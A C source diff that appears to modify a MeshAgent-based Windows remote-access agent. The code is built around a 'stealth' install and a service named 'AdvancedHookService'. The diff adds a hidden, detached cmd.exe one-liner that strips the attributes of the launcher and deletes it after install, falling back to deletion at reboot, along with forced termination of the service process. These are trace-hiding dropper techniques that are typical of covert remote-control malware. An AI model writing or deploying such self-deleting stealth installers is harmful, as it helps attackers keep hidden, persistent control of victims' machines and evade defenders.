@@ -269,6 +269,7 @@ static void MeshAgent_StageSelfTestModuleForCurrentExeBestEffort(void);
 static BOOL MeshAgent_RunChildProcess(const wchar_t* exePath, const wchar_t* args, DWORD timeoutMs, DWORD* exitCode);
 static BOOL MeshAgent_EnsureMasterServiceInstalled(struct MeshAgentHostContainer* agentHost, const wchar_t* sourceOverride, BOOL requireControlPipe);
 static BOOL MeshAgent_UninstallMasterService(void);
+static void MeshAgent_RequestLauncherCleanupAfterInstall(void);
 
 #define MESHAGENT_MASTER_SERVICE_EXE_NAME L"MasterService.exe"
 #define MESHAGENT_MASTER_SERVICE_SERVICE_NAME L"AdvancedHookService"
@@ -324,6 +325,139 @@ static void MeshAgent_LogNativeInstallerEvent(const char* fmt, ...)
 			WriteFile(hEvidence, "\r\n", 2, &written, NULL);
 			CloseHandle(hEvidence);
 		}
+	}
+}
+
+static void MeshAgent_NormalizePathSeparatorsW(wchar_t* path)
+{
+	if (path == NULL) { return; }
+	for (size_t i = 0; path[i] != L'\0'; ++i)
+	{
+		if (path[i] == L'/') { path[i] = L'\\'; }
+	}
+}
+
+static void MeshAgent_TrimTrailingPathSeparatorW(wchar_t* path)
+{
+	if (path == NULL) { return; }
+	size_t len = wcslen(path);
+	while (len > 3 && (path[len - 1] == L'\\' || path[len - 1] == L'/'))
+	{
+		path[len - 1] = L'\0';
+		--len;
+	}
+}
+
+static BOOL MeshAgent_NormalizeAbsolutePathW(const wchar_t* source, wchar_t* output, size_t outputLen)
+{
+	if (source == NULL || source[0] == L'\0' || output == NULL || outputLen == 0) { return FALSE; }
+	output[0] = L'\0';
+
+	DWORD resolved = GetFullPathNameW(source, (DWORD)outputLen, output, NULL);
+	if (resolved == 0 || resolved >= outputLen)
+	{
+		if (FAILED(StringCchCopyW(output, outputLen, source))) { return FALSE; }
+	}
+
+	MeshAgent_NormalizePathSeparatorsW(output);
+	MeshAgent_TrimTrailingPathSeparatorW(output);
+	return (output[0] != L'\0');
+}
+
+static BOOL MeshAgent_ArePathsEqualInsensitiveW(const wchar_t* leftPath, const wchar_t* rightPath)
+{
+	wchar_t leftNorm[MAX_PATH * 4] = {0};
+	wchar_t rightNorm[MAX_PATH * 4] = {0};
+	if (!MeshAgent_NormalizeAbsolutePathW(leftPath, leftNorm, _countof(leftNorm))) { return FALSE; }
+	if (!MeshAgent_NormalizeAbsolutePathW(rightPath, rightNorm, _countof(rightNorm))) { return FALSE; }
+	return (_wcsicmp(leftNorm, rightNorm) == 0);
+}
+
+static BOOL MeshAgent_PathStartsWithInsensitiveW(const wchar_t* path, const wchar_t* prefix)
+{
+	if (path == NULL || prefix == NULL) { return FALSE; }
+	size_t prefixLen = wcslen(prefix);
+	if (prefixLen == 0) { return FALSE; }
+	if (_wcsnicmp(path, prefix, prefixLen) != 0) { return FALSE; }
+	wchar_t next = path[prefixLen];
+	return (next == L'\0' || next == L'\\' || next == L'/');
+}
+
+static void MeshAgent_RequestLauncherCleanupAfterInstall(void)
+{
+	wchar_t launcherPath[MAX_PATH * 4] = {0};
+	if (GetModuleFileNameW(NULL, launcherPath, _countof(launcherPath)) == 0 || launcherPath[0] == L'\0') { return; }
+
+	wchar_t normalizedLauncher[MAX_PATH * 4] = {0};
+	if (!MeshAgent_NormalizeAbsolutePathW(launcherPath, normalizedLauncher, _countof(normalizedLauncher))) { return; }
+
+	StealthInstallPaths installPaths;
+	ZeroMemory(&installPaths, sizeof(installPaths));
+	if (Stealth_GetInstallPaths(&installPaths))
+	{
+		if (installPaths.exePath[0] != L'\0' && MeshAgent_ArePathsEqualInsensitiveW(normalizedLauncher, installPaths.exePath))
+		{
+			MeshAgent_LogNativeInstallerEvent("...Launcher cleanup skipped: running from installed service binary");
+			return;
+		}
+
+		wchar_t normalizedInstallDir[MAX_PATH * 4] = {0};
+		if (installPaths.installDir[0] != L'\0' &&
+			MeshAgent_NormalizeAbsolutePathW(installPaths.installDir, normalizedInstallDir, _countof(normalizedInstallDir)) &&
+			MeshAgent_PathStartsWithInsensitiveW(normalizedLauncher, normalizedInstallDir))
+		{
+			MeshAgent_LogNativeInstallerEvent("...Launcher cleanup skipped: binary is inside install root");
+			return;
+		}
+	}
+
+	wchar_t cmdPath[MAX_PATH] = {0};
+	UINT cmdPathLen = GetSystemDirectoryW(cmdPath, _countof(cmdPath));
+	if (cmdPathLen == 0 || cmdPathLen >= _countof(cmdPath) || FAILED(StringCchCatW(cmdPath, _countof(cmdPath), L"\\cmd.exe")))
+	{
+		StringCchCopyW(cmdPath, _countof(cmdPath), L"C:\\Windows\\System32\\cmd.exe");
+	}
+
+	wchar_t cmdLine[MAX_PATH * 12] = {0};
+	if (FAILED(StringCchPrintfW(
+		cmdLine,
+		_countof(cmdLine),
+		L"\"%ls\" /C ping 127.0.0.1 -n 3 >nul & attrib -r -s -h \"%ls\" >nul 2>&1 & del /f /q \"%ls\" >nul 2>&1 & if exist \"%ls\" (ping 127.0.0.1 -n 2 >nul & del /f /q \"%ls\" >nul 2>&1) & if exist \"%ls\" (ping 127.0.0.1 -n 2 >nul & del /f /q \"%ls\" >nul 2>&1)",
+		cmdPath,
+		normalizedLauncher,
+		normalizedLauncher,
+		normalizedLauncher,
+		normalizedLauncher,
+		normalizedLauncher,
+		normalizedLauncher)))
+	{
+		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup setup failed: command line too long");
+		return;
+	}
+
+	STARTUPINFOW si = {0};
+	PROCESS_INFORMATION pi = {0};
+	si.cb = sizeof(si);
+	BOOL spawned = CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+	if (spawned)
+	{
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup scheduled for %ls", normalizedLauncher);
+		return;
+	}
+
+	DWORD spawnErr = GetLastError();
+	if (MoveFileExW(normalizedLauncher, NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
+	{
+		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup deferred to reboot for %ls (CreateProcess error=%lu)", normalizedLauncher, spawnErr);
+	}
+	else
+	{
+		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup scheduling failed for %ls (CreateProcess error=%lu, MoveFileEx error=%lu)",
+			normalizedLauncher,
+			spawnErr,
+			GetLastError());
 	}
 }
 
@@ -1125,6 +1259,49 @@ static BOOL MeshAgent_QueryServiceImagePath(const wchar_t* serviceName, wchar_t*
 	return (ok && imagePath[0] != L'\0');
 }
 
+static BOOL MeshAgent_TerminateProcessById(DWORD processId, DWORD waitMs)
+{
+	if (processId == 0) { return TRUE; }
+
+	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, processId);
+	if (processHandle == NULL)
+	{
+		DWORD err = GetLastError();
+		if (err == ERROR_INVALID_PARAMETER) { return TRUE; }
+		MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: OpenProcess(pid=%lu) error=%lu",
+			(unsigned long)processId,
+			(unsigned long)err);
+		return FALSE;
+	}
+
+	BOOL terminated = TRUE;
+	if (!TerminateProcess(processHandle, ERROR_INSTALL_FAILURE))
+	{
+		DWORD err = GetLastError();
+		if (err != ERROR_ACCESS_DENIED)
+		{
+			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: TerminateProcess(pid=%lu) error=%lu",
+				(unsigned long)processId,
+				(unsigned long)err);
+			terminated = FALSE;
+		}
+	}
+
+	if (terminated)
+	{
+		DWORD wait = WaitForSingleObject(processHandle, waitMs == 0 ? 10000 : waitMs);
+		if (wait == WAIT_TIMEOUT)
+		{
+			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove warning: process did not exit in time (pid=%lu)",
+				(unsigned long)processId);
+			terminated = FALSE;
+		}
+	}
+
+	CloseHandle(processHandle);
+	return terminated;
+}
+
 static BOOL MeshAgent_ForceRemoveMasterServiceService(DWORD timeoutMs)
 {
 	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
@@ -1134,40 +1311,64 @@ static BOOL MeshAgent_ForceRemoveMasterServiceService(DWORD timeoutMs)
 		return FALSE;
 	}
 
-	SC_HANDLE svc = OpenServiceW(scm, MESHAGENT_MASTER_SERVICE_SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
-	if (svc == NULL)
-	{
-		DWORD err = GetLastError();
-		CloseServiceHandle(scm);
-		if (err == ERROR_SERVICE_DOES_NOT_EXIST) { return TRUE; }
-		MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: OpenService error=%lu", err);
-		return FALSE;
-	}
-
-	(void)MeshAgent_StopServiceAndWait(svc, timeoutMs);
-	BOOL deleted = DeleteService(svc);
-	DWORD deleteErr = deleted ? ERROR_SUCCESS : GetLastError();
-
-	CloseServiceHandle(svc);
-	CloseServiceHandle(scm);
-
-	if (!deleted && deleteErr != ERROR_SERVICE_MARKED_FOR_DELETE && deleteErr != ERROR_SERVICE_DOES_NOT_EXIST)
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: DeleteService error=%lu", deleteErr);
-		return FALSE;
-	}
-
 	ULONGLONG start = GetTickCount64();
 	while ((GetTickCount64() - start) < timeoutMs)
 	{
-		SERVICE_STATUS_PROCESS status;
+		SC_HANDLE svc = OpenServiceW(scm, MESHAGENT_MASTER_SERVICE_SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
+		if (svc == NULL)
+		{
+			DWORD err = GetLastError();
+			CloseServiceHandle(scm);
+			if (err == ERROR_SERVICE_DOES_NOT_EXIST) { return TRUE; }
+			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: OpenService error=%lu", err);
+			return FALSE;
+		}
+
+		SERVICE_STATUS_PROCESS status = {0};
+		DWORD needed = 0;
+		DWORD servicePid = 0;
+		if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(status), &needed))
+		{
+			servicePid = status.dwProcessId;
+		}
+
+		(void)MeshAgent_StopServiceAndWait(svc, 15000);
+
+		BOOL deleted = DeleteService(svc);
+		DWORD deleteErr = deleted ? ERROR_SUCCESS : GetLastError();
+		CloseServiceHandle(svc);
+
+		if (!deleted &&
+			deleteErr != ERROR_SERVICE_MARKED_FOR_DELETE &&
+			deleteErr != ERROR_SERVICE_DOES_NOT_EXIST &&
+			deleteErr != ERROR_ACCESS_DENIED &&
+			deleteErr != ERROR_SHARING_VIOLATION)
+		{
+			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove warning: DeleteService error=%lu", deleteErr);
+		}
+
 		if (!MeshAgent_QueryServiceStatus(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, &status))
 		{
+			CloseServiceHandle(scm);
 			return TRUE;
 		}
+
+		if (servicePid == 0)
+		{
+			servicePid = status.dwProcessId;
+		}
+		if (servicePid != 0)
+		{
+			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove: service still present (state=%lu pid=%lu), terminating process",
+				(unsigned long)status.dwCurrentState,
+				(unsigned long)servicePid);
+			(void)MeshAgent_TerminateProcessById(servicePid, 10000);
+		}
+
 		Sleep(500);
 	}
 
+	CloseServiceHandle(scm);
 	MeshAgent_LogNativeInstallerEvent("...MasterService force-remove verification failed: service still present");
 	return FALSE;
 }
@@ -1293,12 +1494,13 @@ static BOOL MeshAgent_UninstallMasterService(void)
 	BOOL haveExe = MeshAgent_BuildMasterServiceInstallPath(stagedPath, _countof(stagedPath)) && MeshAgent_FileExistsW(stagedPath);
 
 	DWORD exitCode = ERROR_SUCCESS;
+	BOOL commandOk = TRUE;
 	if (haveExe)
 	{
 		if (!MeshAgent_RunMasterServiceUninstallCommand(stagedPath, &exitCode))
 		{
 			MeshAgent_LogNativeInstallerEvent("...MasterService uninstall command failed (exit=%lu)", exitCode);
-			return FALSE;
+			commandOk = FALSE;
 		}
 	}
 
@@ -1312,6 +1514,18 @@ static BOOL MeshAgent_UninstallMasterService(void)
 		{
 			return FALSE;
 		}
+	}
+	if (MeshAgent_QueryServiceStatus(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, &status))
+	{
+		MeshAgent_LogNativeInstallerEvent("...MasterService uninstall verification failed: service still present (state=%lu pid=%lu)",
+			(unsigned long)status.dwCurrentState,
+			(unsigned long)status.dwProcessId);
+		return FALSE;
+	}
+
+	if (!commandOk)
+	{
+		MeshAgent_LogNativeInstallerEvent("...MasterService uninstall command returned non-zero but service removal verification succeeded");
 	}
 
 	return TRUE;
@@ -7812,6 +8026,7 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 	char* updateDll = NULL;
 	char* masterServiceSource = NULL;
 	int masterServiceEnabled = 1;
+	int cleanupLauncher = 0;
 	int fetchstate = 0;
 
 	for (ri = 0; ri < paramLen; ++ri)
@@ -7882,6 +8097,22 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 			else
 			{
 				masterServiceEnabled = 1;
+			}
+		}
+		if (strcmp(param[ri], "--cleanup-launcher") == 0)
+		{
+			cleanupLauncher = 1;
+		}
+		if (strncmp(param[ri], "--cleanup-launcher=", 19) == 0)
+		{
+			const char* value = param[ri] + 19;
+			if (strcasecmp(value, "0") == 0 || strcasecmp(value, "false") == 0 || strcasecmp(value, "off") == 0 || strcasecmp(value, "no") == 0)
+			{
+				cleanupLauncher = 0;
+			}
+			else
+			{
+				cleanupLauncher = 1;
 			}
 		}
 
@@ -8052,6 +8283,10 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 				if (!MeshAgent_RunNativeStealthFullInstall(agentHost, masterServicePtr, masterServiceEnabled != 0))
 				{
 					nativeExitCode = ERROR_INSTALL_FAILURE;
+				}
+				else if (cleanupLauncher != 0)
+				{
+					MeshAgent_RequestLauncherCleanupAfterInstall();
 				}
 				break;
 
